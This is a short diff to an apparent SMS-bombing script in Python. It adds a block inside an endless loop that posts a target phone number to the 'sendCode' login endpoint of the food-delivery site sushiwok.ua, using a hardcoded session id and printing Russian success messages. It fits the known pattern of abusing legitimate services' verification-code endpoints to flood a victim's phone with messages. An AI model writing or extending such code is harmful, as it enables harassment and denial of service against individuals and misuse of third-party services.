@@ -723,7 +723,14 @@ while True:
         time.sleep(0.1)
     except:
         print('[-] error in sent!')
-
+        
+    try:
+        requests.post('https://sushiwok.ua/', data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode", "phone": _phone,"registration": "N",})
+        print('[+] Sushiwok отправлено!')
+        time.sleep(0.1)
+    except:
+        print('[-] не отправлено!')
+        
 
 
     try:
